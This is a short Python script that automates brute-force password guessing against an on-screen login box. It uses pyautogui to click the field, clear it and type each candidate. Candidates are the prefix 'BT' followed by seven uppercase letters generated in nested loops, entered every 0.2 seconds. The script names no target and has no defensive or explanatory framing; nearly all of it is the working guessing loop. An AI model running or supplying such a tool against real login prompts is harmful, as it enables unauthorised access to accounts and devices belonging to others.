from PIL import Image, ImageOps
import pyscreenshot as ImageGrab
import pyautogui
import time
import string
import sys
import keyboard
from numpy import *

from ctypes import *

class Cordinates():
    loginBtn = (250, 450)
    box = (225,405)
    #x=345 check for tree
    #y=470 check for height
# def login():
#     pyautogui.click(Cordinates.loginBtn)

def boxcor():
    pyautogui.click(Cordinates.box)

def pressPassword():
        for q in range(21):
            for w in range (26):
                for e in range (26):
                    for r in range (26):
                        for t in range (26):
                            for y in range(26):
                                boxcor()
                                pyautogui.keyDown('ctrl')
                                pyautogui.press(['a','del'])
                                pyautogui.keyUp('ctrl')
                                a="BT"
                                a=a+chr(69+q)+chr(65+w)+chr(65+e)+chr(65+r)+chr(65+t)+chr(65+y)
                                pyautogui.typewrite(a)
                                pyautogui.press('enter')
                                time.sleep(0.2)
                                if pyautogui.position() == (1, 1):
                                    exit()

def main():
        pressPassword()

main()

